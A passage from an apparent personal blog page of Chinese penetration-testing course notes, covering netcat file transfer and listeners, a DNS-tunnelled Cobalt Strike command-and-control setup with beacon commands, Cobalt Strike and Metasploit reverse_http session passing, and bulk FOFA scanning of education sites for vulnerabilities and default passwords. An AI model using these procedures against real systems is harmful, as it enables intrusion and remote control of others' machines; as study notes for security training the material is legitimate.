class="number">.76</span><span class="number">.143</span></span><br><span class="line">端口扫描	nc -v -z <span class="number">192.68</span><span class="number">.76</span><span class="number">.143</span> <span class="number">1</span>-<span class="number">1000</span></span><br><span class="line">端口监听	nc -lvp xxxx</span><br><span class="line">文件传输	nc -lp <span class="number">1111</span>&gt;<span class="number">1.</span>txt|nc -vn xx.xx.xx.xx <span class="number">1111</span>&lt;<span class="number">1.</span>txt -q <span class="number">1</span></span><br><span class="line">反弹shell		见上</span><br><span class="line"></span><br><span class="line"><span class="comment">#	应用层DNS隧道配合CS上线-检测，利用，说明</span></span><br><span class="line">当常见协议监听器被拦截时，可以换其它协议上线，其中dns协议上线基本通杀</span><br><span class="line"><span class="number">1.</span>云主机teamserver配置端口<span class="number">53</span>启用-udp</span><br><span class="line"><span class="number">2.</span>买一个域名修改记录如下：</span><br><span class="line">	A记录-&gt;cs主机名-&gt;CS服务器IP</span><br><span class="line">    NS记录-&gt;ns1主机名-&gt;上个A记录地址</span><br><span class="line">    NS记录-&gt;ns2主机名-&gt;上个A记录地址</span><br><span class="line"><span class="number">3.</span>配置DNS监听器内容如下:</span><br><span class="line">    ns1.xiaodi8.com</span><br><span class="line">    ns2.xiaodi8.com</span><br><span class="line">    cs.xiaodi8.com</span><br><span class="line"><span class="number">4.</span>生成后门执行上线后启用命令</span><br><span class="line">	beacon&gt; checkin[*]			checkin</span><br><span class="line">    Tasked beacon to checkin</span><br><span class="line">    beacon&gt; mode dns-txt</span><br><span class="line">    ...</span><br><span class="line">    beacon&gt; shell whoami</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<h3 id="day72-内网安全-域横向CS-amp-MSF联动及应急响应初识"><a href="#day72-内网安全-域横向CS-amp-MSF联动及应急响应初识" class="headerlink" title="day72-内网安全-域横向CS&amp;MSF联动及应急响应初识"></a>day72-内网安全-域横向CS&amp;MSF联动及应急响应初识</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	演示案例	MSF&amp;Cobalt Strike联动shell</span></span><br><span class="line">CS-&gt;MSF</span><br><span class="line">	创建Foreign监听器-&gt;MSF监听模块设置对应地址端口-&gt;CS执行spawn选择监听器</span><br><span class="line">MSF-&gt;CS</span><br><span class="line">	CS创建监听器-&gt;MSF载入新模块注入设置对应地址端口-&gt;执行CS等待上线</span><br><span class="line"></span><br><span class="line"><span class="comment">#	CS联动MSF		虚拟机情况下 被控主机win测试成功</span></span><br><span class="line"><span class="number">1.</span>创建Foreign监听器</span><br><span class="line">	<span class="string">&quot;Listeners&quot;</span> <span class="string">&quot;Add&quot;</span> <span class="string">&quot;Name&quot;</span>填任意 <span class="string">&quot;Payload&quot;</span>选<span class="string">&quot;Foreign HTTP&quot;</span> <span class="string">&quot;HTTP Host(Stager)&quot;</span>填msf的ip地址 <span class="string">&quot;HTTP Port(stager)&quot;</span>		<span class="comment">#ip端口填的msf的</span></span><br><span class="line">    该监听器与木马绑定的监听器非同一个监听器</span><br><span class="line"><span class="number">2.</span>MSF监听模块设置对应地址端口</span><br><span class="line">    选择监听模块</span><br><span class="line">        use exploit/multi/handler</span><br><span class="line">    设置payload,注意与CS保持一致</span><br><span class="line">        <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">    设置地址端口，其中地址可以不设或为<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>，意为任意地址，或者设为msf的ip地址(与CS保持一致)；端口一定要保持一致</span><br><span class="line">    <span class="built_in">set</span> lhost <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">    <span class="built_in">set</span> lport <span class="number">6677</span></span><br><span class="line">   	检查设置</span><br><span class="line">    	show options</span><br><span class="line">    执行</span><br><span class="line">    	exploit</span><br><span class="line"><span class="number">3.</span>CS执行Spawn选择监听器</span><br><span class="line">	选择需要反弹shell的电脑，右键<span class="string">&quot;Spawn&quot;</span>，选择刚才生成的监听器		此处相当于cs段</span><br><span class="line">    稍等可在MSF上看见反弹结果,如果没有请检查网络</span><br><span class="line">    </span><br><span class="line"><span class="comment">#	MFS联动CS		虚拟机情况下 被控主机win测试成功</span></span><br><span class="line"><span class="number">1.</span>CS创建监听器</span><br><span class="line">	创建一个普通监听器</span><br><span class="line"><span class="number">2.</span>MSF载入新模块注入设置对应地址端口</span><br><span class="line">	首先查看session值</span><br><span class="line">    	background</span><br><span class="line">    	sessions</span><br><span class="line">    载入注入模块并设置，注意跟CS监听器保持一致		<span class="comment">#reverse_http</span></span><br><span class="line">    	use exploit/windows/local/payload_inject</span><br><span class="line">        <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">        <span class="built_in">set</span> lport [CS的端口号]</span><br><span class="line">        <span class="built_in">set</span> lhost [CS的ip]</span><br><span class="line">        <span class="built_in">set</span> session [session的<span class="built_in">id</span>]</span><br><span class="line">        exploit</span><br><span class="line">      </span><br><span class="line"><span class="comment">#	加入新的条件</span></span><br><span class="line">	<span class="number">1.</span>外网</span><br><span class="line">    <span class="number">2.</span>linux 被控机器 linux制作马</span><br><span class="line">    <span class="number">3.</span>不出网 socks5代理或者别的代理软件</span><br><span class="line">    </span><br><span class="line"><span class="comment">#	应急响应</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>























<h3 id="day76-Python开发-内外网收集Socket-amp-子域名-amp-DNS"><a href="#day76-Python开发-内外网收集Socket-amp-子域名-amp-DNS" class="headerlink" title="day76-Python开发-内外网收集Socket&amp;子域名&amp;DNS"></a>day76-Python开发-内外网收集Socket&amp;子域名&amp;DNS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">前期信息收集</span><br><span class="line">	外网</span><br><span class="line">		IP/Whois CDN判断 端口扫描 子域名收集 第三方调用</span><br><span class="line">	内网</span><br><span class="line">		存活主机 协议探针 端口扫描</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Socket部分技术 进程命令执行 交互参数执行 NMAP工具模块使用 异常处理</span></span><br></pre></td></tr></table></figure>



<h3 id="day86-SRC挖掘-教育行业平台-amp-规则-amp-批量自动化"><a href="#day86-SRC挖掘-教育行业平台-amp-规则-amp-批量自动化" class="headerlink" title="day86-SRC挖掘-教育行业平台&amp;规则&amp;批量自动化"></a>day86-SRC挖掘-教育行业平台&amp;规则&amp;批量自动化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">src挖掘</span><br><span class="line">	教育漏洞平台</span><br><span class="line">		规则		法律法规 漏洞说明 评分奖励</span><br><span class="line">		思路 		常规安全</span><br><span class="line">					Xray AWVS 平台默认弱口令</span><br><span class="line">				 定点检测</span><br><span class="line">				 	ThinkPhp代码执行 Shiro反序列化 fastjson反序列化</span><br><span class="line">	CNVD</span><br><span class="line">	盒子 补天 其他</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1676471444688.png" alt="1676471444688"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 	教育机构</span></span><br><span class="line">1.批量爬取网址</span><br><span class="line">	教育类网站		 		  edu.cn</span><br><span class="line">	python批量fofa 			<span class="string">&quot;edu.cn&quot;</span> &amp;&amp; country=<span class="string">&quot;CN&quot;</span></span><br><span class="line">2.漏扫工具搞</span><br><span class="line">3.定点检测</span><br><span class="line">	https://www.seebug.org/vuldb/vulnerabilities</span><br><span class="line">	针对特定漏洞复现 举例timeline sec团队的 批量检测</span><br><span class="line">		https://github.com/TimelineSec/2020-Vulnerabilities已下载</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">弱口令项目地址</span><br><span class="line">	https://github.com/ihebski/DefaultCreds-cheat-sheet</span><br><span class="line">		C:\Users\hyy\Desktop\网络安全\小迪网安\DefaultCreds-cheat-sheet-main\DefaultCreds-Cheat-Sheet.csv</span><br><span class="line">		常见平台的弱口令</span><br></pre></td></tr></table></figure>



<h3 id="day88-SRC挖掘-拿下CNVD证书开源-amp-闭源-amp-售卖系统"><a href="#day88-SRC挖掘-拿下CNVD证书开源-amp-闭源-amp-售卖系统" class="headerlink" title="day88-SRC挖掘-拿下CNVD证书开源&amp;闭源&amp;售卖系统"></a>day88-SRC挖掘-拿下CNVD证书开源&amp;闭源&amp;售卖系统</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CNVD漏洞平台</span><br><span class="line">	条件 通用性100+（影响资产）</span><br><span class="line">    分类</span><br><span class="line">    	开源		代码审计 自动扫描</span><br><span class="line">    	闭源</span><br><span class="line">    		尝试性获取源码</span><br><span class="line">    		无源码下JS接口测试</span><br><span class="line">    		常规类黑盒安全测试</span><br><span class="line">    	售卖</span><br><span class="line">    		尝试性获取源码</span><br><span class="line">    		无源码下JS接口测试</span><br><span class="line">    		常规类黑盒安全测试</span><br><span class="line">    技术</span><br><span class="line">    	代码审计 	PHP .NET JAVA</span><br><span class="line">    	影响查找	黑暗引擎 白白引擎</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/05/%E5%B0%8F%E8%BF%AA2020/" data-id="cljpcwhu10008l8ez6sd64t8o" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/07/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%88%E4%BE%8B/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/dvwa/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>